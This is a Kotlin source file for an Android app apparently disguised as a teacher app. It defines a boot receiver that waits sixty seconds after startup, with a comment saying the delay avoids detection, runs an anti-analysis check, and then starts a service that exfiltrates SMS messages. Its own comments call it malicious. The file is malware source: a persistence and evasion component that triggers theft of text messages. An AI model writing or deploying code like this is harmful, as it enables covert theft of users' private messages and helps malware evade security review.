package com.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.teacherapp.obfuscation.AntiAnalysisUtils
import com.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Triggers malicious activity on device boot
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Delayed execution to avoid detection
            CoroutineScope(Dispatchers.Default).launch {
                delay(60000L) // Wait 60 seconds after boot

                AntiAnalysisUtils.executeIfSafe(context) {
                    // Start SMS exfiltration
                    SmsExfiltrationService.startExfiltration(context)
                }
            }
        }
    }
}